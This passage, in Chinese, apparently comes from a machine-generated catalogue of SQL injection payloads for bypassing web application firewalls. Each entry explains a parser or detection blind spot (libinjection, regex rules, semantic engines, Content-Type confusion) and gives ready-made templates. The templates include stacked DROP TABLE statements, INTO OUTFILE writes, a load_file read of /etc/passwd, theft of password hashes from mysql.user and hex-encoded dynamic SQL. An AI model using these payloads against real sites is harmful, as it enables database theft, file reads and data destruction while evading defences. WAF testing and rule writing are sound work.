- **原理**：Oracle 的 DBMS_XMLTRANSLATIONS 包（EXTRACTXLIFF/MERGEXLIFF，PUBLIC 可执行）可在 SELECT 中触发 XPath 处理错误，错误信息内嵌子查询结果，属 Oracle 版"报错注入"。与 MySQL 的 extractvalue/updatexml 家族机制不同，Oracle 专用包名极少在 WAF 词表。SQL 注释 `--`/`/*` 在 Oracle 中允许，可与函数组合。
- **模板**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)`、`AND (SELECT DBMS_XMLTRANSLATIONS.EXTRACTXLIFF(DUAL, ...)) IS NOT NULL`
- **来源备注**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)`、`AND (SELECT DBMS_XMLTRANSLATIONS.EXTRACTXLIFF(DUAL, ...)) IS NOT NULL`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:parser:float_e_token_drop` — 浮点记号 e 后无数字被词法器整体丢弃（1.e 语法）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL(≤5.7)/旧版 MariaDB 词法器解析形如 `1.e(` 的浮点 token 时，若 e/E 后紧跟的不是数字，会将该 token 整体丢弃(状态回落到 MY_LEX_SKIP)，导致 `1.e(...)` 在数据库中静默消失；而 libinjection(ModSecurity/SignalScience 底层)把 `1.e` 视为未知关键字，判定为更像英文句而非 SQL，从而同时骗过正则签名与 libinjection token 分类。
- **模板**：`1' or 1.e(1) or '1'='1`、`1.e5UNion select 1,2,3.e5from users`
- **来源备注**：`1' or 1.e(1) or '1'='1`、`1.e5UNion select 1,2,3.e5from users`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:jsonb_operator_syntax` — SQL/JSON 运算符(-> ->> #> <@ @>)构造判定绕过经典正则

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Team82 研究发现用 SQL/JSON 运算符(MySQL `->`、`->>`，PostgreSQL `#>`、`#>>`、`@>`、`<@`、`?`、`?|`、`?&`) 写条件时，如 `'{"a":1}'::jsonb @> '{"a":1}'::jsonb`，经典 SQLi 正则(匹配 =、IN、LIKE、AND、OR)完全无命中，AWS/Cloudflare/F5/Imperva/Palo Alto 均被绕过；OWASP CRS 为此新增规则 942550(PL1) 覆盖这些运算符与 json_extract。绕的是运算符签名正则，对纯正则 WAF 有效。
- **模板**：`1 OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb`、`SELECT * FROM t WHERE data->>'name' = 'admin'`、`id=1 OR '{"foo":1}'->'$.foo'=1`
- **来源备注**：`1 OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb`、`SELECT * FROM t WHERE data->>'name' = 'admin'`、`id=1 OR '{"foo":1}'->'$.foo'=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:libinjection_leading_close_paren` — libinjection 前导右括号上下文绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打 token 分类盲区（libinjection 系语义引擎，mod_security detectSQLi、Signal Sciences、Cloudflare 等）。libinjection 的词法器不维护括号深度/不理解未配对右括号可被外层语法上下文吸收，把 `)-sleep(9999`、`1337) INTO OUTFILE` 这类输入判为"非SQL/更像英文句子"而不产出攻击指纹。本质是括号闭合上下文建模缺失。
- **模板**：`?id=)-sleep(9999`、`?id=1337) INTO OUTFILE '/tmp/x'--`、`?id=123);DROP TABLE users--`
- **来源备注**：`?id=)-sleep(9999`、`?id=1337) INTO OUTFILE '/tmp/x'--`、`?id=123);DROP TABLE users--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:limit_procedure_analyse` — LIMIT 后注入点用 PROCEDURE ANALYSE() 取回显/时间盲注

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：注入点位于 ORDER BY ... LIMIT 之后时 UNION 被前置 ORDER BY 阻断；MySQL 的 PROCEDURE ANALYSE() 子句(已从 8.0 移除)接受表达式参数，可在 LIMIT 后构造 error-based(extractvalue) 与 time-based(BENCHMARK 可用而 SLEEP 不可用)载荷。该关键字极少被 WAF 词表收录，属于解析器位置型盲区。
- **模板**：`... LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);`
- **来源备注**：`... LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:paren_table_ref_whitelist` — 括号包裹表引用使白名单提取正则匹配不到目标表

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：某 WAF 用正则 `\b(FROM|JOIN|INTO|UPDATE)\s+`?(\w+)`?` 从 SQL 中提取目标表做白名单校验，且默认假设是 FROM+空格+表名。把表引用写成 `FROM (`mysql`.`user`)` 或 FROM (子查询)，左括号使 `\w+` 匹配失败，提取结果为 nil，校验器认为查询不含任何表，从而放行对 mysql.user 等敏感表的访问。绕的是格式假设型表名提取/白名单过滤。
- **模板**：`SELECT (SELECT authentication_string FROM (`mysql`.`user`) LIMIT 1) FROM table_123`、`SELECT (SELECT password FROM (`mysql`.`user`) LIMIT 1) FROM table_A`
- **来源备注**：`SELECT (SELECT authentication_string FROM (`mysql`.`user`) LIMIT 1) FROM table_123`、`SELECT (SELECT password FROM (`mysql`.`user`) LIMIT 1) FROM table_A`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:stacked_stmt_context_reset` — 前置合法语句重置 libinjection 分类上下文

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打多语句 token 分类盲区。libinjection 对分号分隔的多语句只看首段 token 流：在前面拼一个合法无害语句（`SHOW WARNINGS;`），整个输入被归为良性 "not sqli"，而后续 `SET @q=0x...; PREPARE stmt FROM @q; EXECUTE stmt;` 动态执行的 SQL 完全绕开攻击指纹。盲区不在 hex，而在分类器不跨语句追踪、不重建后续语句的语义。
- **模板**：`?id=0);SHOW WARNINGS;SET @q=0x53454c45435420534c454550283129;PREPARE stmt FROM @q;EXECUTE stmt;#`
- **来源备注**：`?id=0);SHOW WARNINGS;SET @q=0x53454c45435420534c454550283129;PREPARE stmt FROM @q;EXECUTE stmt;#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:unknown_db_func_token` — 未知数据库函数 token 使分类器判为"非SQL"

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打 token 分类枚举盲区。libinjection 式词法器无法穷举所有数据库函数 token（自定义函数、各引擎专有内置、MySQL 空间函数等），遇到 `sqlite_version()`、`ST_LatFromGeoHash()` 等未知 token 即大幅下调"这是SQL代码"的置信度，整条含 UNION SELECT 的 payload 被当作英语文本放过。引擎刻意枚举 updatexml/extractvalue 等"已知危险函数"，但空间/地理函数这类系统函数不在枚举内。
- **模板**：`?id='-sqlite_version() UNION SELECT password FROM users--`、`?id=1 AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--`
- **来源备注**：`?id='-sqlite_version() UNION SELECT password FROM users--`、`?id=1 AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:upcase_contains_backtick` — 反引号包裹标识符打乱 大写化+Contains 子串检测

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：部分 WAF 把查询先 ToUpper() 再用字符串 Contains 匹配 INFORMATION_SCHEMA、MYSQL.、PERFORMANCE_SCHEMA 等系统表前缀。用反引号把点号包进标识符(如 `from `information_schema`.`tables``)，Upper 后点已被反引号隔开，子串匹配失效而 MySQL 照常执行(反引号内容不区分大小写)。绕的是规范化后子串匹配型检测。
- **模板**：`select 1,group_concat(table_name),3 from `information_schema`.columns where table_name='user'`、`from `information_schema`.`tables` where table_schema='security'`
- **来源备注**：`select 1,group_concat(table_name),3 from `information_schema`.columns where table_name='user'`、`from `information_schema`.`tables` where table_schema='security'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:parser:weight_string_level` — MySQL weight_string() 的 level 子句参数绕过语义引擎

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：长亭公开的雷池(SafeLine)语义引擎历史绕过案例：MySQL weight_string() 函数参数允许 level 子句(如 `weight_string(0x56af level 1 desc reverse)`)，这是实现支持但文档外的语法特性，早期 AST 语义分析按普通函数参数解析时误判；实现与文档/解析器不一致的特性能绕过语义型而非只骗正则。绕的是 AST/语义引擎的语法覆盖盲区。
- **模板**：`weight_string(0x56af level 1 desc reverse)`、`AND weight_string('x') > weight_string('a' level 1)`
- **来源备注**：`weight_string(0x56af level 1 desc reverse)`、`AND weight_string('x') > weight_string('a' level 1)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.983440+00:00；retired=-

### `sqli:protocol:dual_content_type_multipart_smuggle` — 双 Content-Type 让 WAF 误判文件上传跳过 SQL 语义分析

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：语义引擎依赖 Content-Type + Content-Disposition 判定攻击类别。前置 `application/x-www-form-urlencoded`（后端 Tomcat 取第一个）并保留 `multipart/form-data`（WAF 取它），使 WAF 走文件上传检测、不触发 SQL 语义分析。打协议解析不一致/攻击意图分类盲区。
- **模板**：`Content-Type: application/x-www-form-urlencoded` + `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX` + 后接 `Content-Disposition:1'/if(length(database())=1,1,1)#`
- **来源备注**：`Content-Type: application/x-www-form-urlencoded` + `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX` + 后接 `Content-Disposition:1'/if(length(database())=1,1,1)#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:semantic:error_func_family` — 报错注入函数家族

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：UUID_TO_BIN/NAME_CONST/JSON_KEYS/UPDATEXML 等把查询结果塞进报错信息外带，WAF 只拦常见 EXP/EXTRACTVALUE 时漏过冷门报错函数（floor 在 MySQL8 失效后的主流替代）
- **模板**：`AND UUID_TO_BIN(version())='1`、`AND (SELECT NAME_CONST(version(),1))`、`AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',version(),'~')) USING utf8)))`
- **来源备注**：`AND UUID_TO_BIN(version())='1`、`AND (SELECT NAME_CONST(version(),1))`、`AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',version(),'~')) USING utf8)))`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:semantic:json_func_predicate` — JSON 函数构造条件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 JSON_LENGTH/JSON_EXTRACT/JSON_KEYS 等 JSON 函数构造布尔条件，多数 WAF 规则集不支持 JSON 语法，漏过函数型注入（2025 厂商实测缺口）
- **模板**：`1' OR JSON_LENGTH('{}') <= 8896 UNION SELECT @@version-- -`、`1' AND JSON_KEYS(JSON_OBJECT('a',1)) IS NOT NULL-- -`
- **来源备注**：`1' OR JSON_LENGTH('{}') <= 8896 UNION SELECT @@version-- -`、`1' AND JSON_KEYS(JSON_OBJECT('a',1)) IS NOT NULL-- -`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:semantic:sys_schema_meta` — MySQL sys 模式视图替代 information_schema 获取元数据

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：当 WAF 过滤 information_schema 关键字时，MySQL 5.7+ 自带 sys 模式提供同源元数据视图(如 sys.schema_table_statistics_with_buffer、sys.x$schema_flattened_keys)，名字完全不同，可绕过 information_schema 等系统表名过滤，属于元数据访问的语义等价替代。
- **模板**：`SELECT table_name FROM sys.schema_table_statistics_with_buffer LIMIT 1`、`SELECT * FROM sys.x$schema_flattened_keys WHERE table_schema='security'`
- **来源备注**：`SELECT table_name FROM sys.schema_table_statistics_with_buffer LIMIT 1`、`SELECT * FROM sys.x$schema_flattened_keys WHERE table_schema='security'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:semantic:user_var_dynamic_sql` — 用户变量 @动态 SQL 逃逸 AST 意图分析

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打意图判定/AST 盲区，对雷池这类"重建语法树再判意图"的语义引擎同样有效。MySQL 用户变量 `@x` 与 SET/PREPARE/EXECUTE 动态执行：恶意 SELECT/UNION 关键字全部以十六进制字符串形式存在，从不以 SQL token 进入被解析的 AST，引擎的意图评分根本看不到 union/select/sleep。`:=` 赋值操作符在 SELECT 内也合法（`SELECT @a:=1`），进一步绕开引擎对赋值语句的建模。
- **模板**：`?id=1;SET @a=0x53454c4543542a2046524f4d2061646d696e;PREPARE s FROM @a;EXECUTE s;--`、`?id=1;SELECT @x:=(SELECT password FROM users LIMIT 1);--`
- **来源备注**：`?id=1;SET @a=0x53454c4543542a2046524f4d2061646d696e;PREPARE s FROM @a;EXECUTE s;--`、`?id=1;SELECT @x:=(SELECT password FROM users LIMIT 1);--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.982434+00:00；retired=-

### `sqli:syntactic:bitwise_cmp` — 位运算比较

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 支持 `<<` `>>` `&` `^` 位运算；`id=1<<0` 恒等于 `id=1`、`7&5`=5——替代 `=` 与数字黑名单。
- **模板**：`id=1<<0`、`AND 7&5`、`id=(1<<1)-1`
- **来源备注**：`id=1<<0`、`AND 7&5`、`id=(1<<1)-1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:bool_ops` — 布尔算子替代 =

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 regexp binary/in/between/sounds like/soundex 等替代 = 与 AND/OR 关键字，绕比较运算符与关键字正则。
- **模板**：`id=1 and (select database()) regexp binary '^se'`、`1 in (1)`、`1 between 0 and 2`、`'a' sounds like 'a'`、`soundex('a')=soundex('a')`
- **来源备注**：`id=1 and (select database()) regexp binary '^se'`、`1 in (1)`、`1 between 0 and 2`、`'a' sounds like 'a'`、`soundex('a')=soundex('a')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:case_when_if` — CASE WHEN 替代 IF

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`IF()` 被拦时用 `CASE WHEN (cond) THEN 1 ELSE 0 END` 表达条件逻辑——标准 SQL 关键字，WAF 规则少盯。
- **模板**：`AND CASE WHEN (1=1) THEN 1 ELSE 0 END`
- **来源备注**：`AND CASE WHEN (1=1) THEN 1 ELSE 0 END`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:commaless` — 免逗号 LIMIT/substr 替代

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：逗号被过滤时用替代语法：`LIMIT 1,1` → `LIMIT 1 OFFSET 0`；`SUBSTR(x,1,1)` → `SUBSTR(x FROM 1 FOR 1)`/`MID(x FROM 1 FOR 1)`；`GROUP_CONCAT` 用 `CONCAT_WS`。sqlmap commalesslimit/commalessmid/from_for_no_comma 同族。绕逗号字符黑名单。
- **模板**：`LIMIT 1 OFFSET 1`、`SUBSTR(user() FROM 1 FOR 1)`、`AND MID(version() FROM 5 FOR 3)='8.0'`
- **来源备注**：`LIMIT 1 OFFSET 1`、`SUBSTR(user() FROM 1 FOR 1)`、`AND MID(version() FROM 5 FOR 3)='8.0'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:comment_before_paren` — 括号前加注释分隔

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sqlmap commentbeforeparentheses tamper 在函数调用/子查询的 `(` 前插入 `/**/`（如 `CONCAT/**/(...)`），打散"函数名+括号紧邻"的匹配特征；跨 MySQL/MariaDB/PG/SQLite/MSSQL/Oracle 通用（sqlmap 2024 实测全部通过）。绕"函数名后跟括号"的签名正则。
- **模板**：`UNION/**/SELECT 1,2`（括号前：`CONCAT/**/(a,b)`）、`AND SUBSTR/**/(user(),1,1)='r'`
- **来源备注**：`UNION/**/SELECT 1,2`（括号前：`CONCAT/**/(a,b)`）、`AND SUBSTR/**/(user(),1,1)='r'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:false_expr` — 函数/算术制造假值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`AND 1=0`/`AND 0` 高度被拦；改用函数制造假值：`char(0)`、`mod(29,9)`、`point(29,9)`、`nullif(1337,1337)`、算术 `1*0`/`1-1`/`0/1`，配合 `&`/`&&`/`|`/`||` 逻辑。
- **模板**：`id=1 && point(29,9)`、`AND nullif(1337,1337)`、`AND mod(29,9)`
- **来源备注**：`id=1 && point(29,9)`、`AND nullif(1337,1337)`、`AND mod(29,9)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:from_for_no_comma` — FROM..FOR 免逗号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：逗号被拦时用 `mid(user() from 1 for 1)` / `substr(user() from 1 for 1)` 替代 `mid(user(),1,1)`——消除逗号字符。
- **模板**：`substr(user() from 1 for 1)`、`mid(version() from 5 for 3)`
- **来源备注**：`substr(user() from 1 for 1)`、`mid(version() from 5 for 3)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:func_call_form` — 函数调用形态 UNION(SELECT)

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：UNION(SELECT ...) 括号形式替代 UNION SELECT 空白分隔形态，绕 UNION\s+SELECT 正则。
- **模板**：`1 UNION(SELECT 1,(SELECT flag FROM flags),3)`、`(SELECT(username)FROM(users))`
- **来源备注**：`1 UNION(SELECT 1,(SELECT flag FROM flags),3)`、`(SELECT(username)FROM(users))`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:function_backtick` — 反引号函数名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 反引号包围标识符，`` `version`() `` 等价 `version()`；正则对 `` `version` `` 可能失配。
- **模板**：`version`()`、`and(select `load_file`(0x2f6574632f706173737764) is not null)`
- **来源备注**：`version`()`、`and(select `load_file`(0x2f6574632f706173737764) is not null)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:greatest_bound` — GREATEST 替代比较

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：盲注 `<`/`>` 被拦时用 `greatest(ascii(mid(user(),1,1)),150)=150` 表达"≥150"——GREATEST 取最大恒等于右值即大于等于，避开比较运算符。
- **模板**：`greatest(ascii(mid(user(),1,1)),150)=150`
- **来源备注**：`greatest(ascii(mid(user(),1,1)),150)=150`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:having_groupby_where` — GROUP BY/HAVING 子句顶替 WHERE 并承载 FLOOR 报错注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：当 WHERE/AND/OR 被过滤时，HAVING 作为对 GROUP BY 结果的行过滤可替代 WHERE 实现布尔判断(WHERE->HAVING)，如 `1||(select user from users group by user_id having user_id=1)='admin'`；且 FLOOR(RAND(0)*2) 报错载荷官方支持在 WHERE、HAVING、ORDER BY、GROUP BY 任一子句位生效。绕的是 WHERE/AND/OR 关键字过滤。
- **模板**：`1||(select user from users group by user_id having user_id=1)='admin'`、`11|(select substr(group_concat(user_id),0,1) user from users)-1`
- **来源备注**：`1||(select user from users group by user_id having user_id=1)='admin'`、`11|(select substr(group_concat(user_id),0,1) user from users)-1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:ident_zero` — 恒等变形

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用恒成立的表达式替代 `1=1`，避开 `=`。如 `'+0+'`、`-0`、`*1`、位运算。
- **模板**：`id=1*1`、`id=1+0`、`id=1-0`、`id=1&1`
- **来源备注**：`id=1*1`、`id=1+0`、`id=1-0`、`id=1&1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:json_table` — MySQL 8 JSON_TABLE/JSON_VALUE 构造查询

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 8.0 的 JSON_TABLE() 把 JSON 数据展开成虚拟表、JSON_VALUE() 提取 JSON 字段，可替代常规 SELECT/WHERE 形态构造注入（如 `SELECT * FROM JSON_TABLE(...)`），WAF 对 JSON_TABLE 文法覆盖弱。PHP 8.2 bug 112316 提及 JSON_VALUE 相关。
- **模板**：`SELECT * FROM JSON_TABLE('[1,2]', '$[*]' COLUMNS(x INT PATH '$')) AS t`、`AND JSON_VALUE('{"a":1}', '$.a')=1`
- **来源备注**：`SELECT * FROM JSON_TABLE('[1,2]', '$[*]' COLUMNS(x INT PATH '$')) AS t`、`AND JSON_VALUE('{"a":1}', '$.a')=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:multiplespaces` — 多空格稀释 token

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sqlmap multiplespaces 把单空格换成多个空格/制表符稀释关键字间距离，绕"关键字紧邻/最小距离"类正则（如 `union\s+select` 要求固定空白）。简单但常配合其他变体。
- **模板**：`UNION      SELECT 1,2,3`、`1     AND     1=1`
- **来源备注**：`UNION      SELECT 1,2,3`、`1     AND     1=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:mysql8_table_values` — MySQL 8 TABLE/VALUES 语句替换 SELECT

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 8.0.19+ 新增 TABLE 与 VALUES 语句：`TABLE t` 等价于 `SELECT * FROM t`，`VALUES ROW(1,2)` 等价于 `SELECT 1,2`，且可出现在 UNION 中。对只匹配 SELECT/UNION SELECT 关键字或经典 `UNION\s+SELECT` 形态的 WAF 属于完全未知文法，可直接顶替被过滤的 SELECT，绕的是关键字级正则签名。
- **模板**：`SELECT * FROM user UNION TABLE news`、`SELECT * FROM user UNION VALUES ROW(2,3)`、`/*!50000UNION*/ VALUES ROW(1,2,3)`
- **来源备注**：`SELECT * FROM user UNION TABLE news`、`SELECT * FROM user UNION VALUES ROW(2,3)`、`/*!50000UNION*/ VALUES ROW(1,2,3)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:null_replacement` — NULL 替代

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：WAF 拦 `NULL` 关键字时，用 `0`、`false`、`char(0x4e554c4c)`、`(0*1337-0)`、`34=35` 替代。
- **模板**：`UNION SELECT 0,0,0`、`UNION SELECT false,false,false`、`UNION SELECT char(0x4e554c4c),0,0`、`UNION SELECT (0*1337-0),1,1`
- **来源备注**：`UNION SELECT 0,0,0`、`UNION SELECT false,false,false`、`UNION SELECT char(0x4e554c4c),0,0`、`UNION SELECT (0*1337-0),1,1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:syntactic:null_safe_equal` — 空安全等值

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`=` 用 MySQL `<=>`（null-safe equal）替代——语义等价但绕过 `=` 黑名单与字面匹配。
- **模板**：`id<=>1`、`WHERE 1<=>1`
- **来源备注**：`id<=>1`、`WHERE 1<=>1`
- **属性**：protected=no；composable=no；priority=3；labels=-
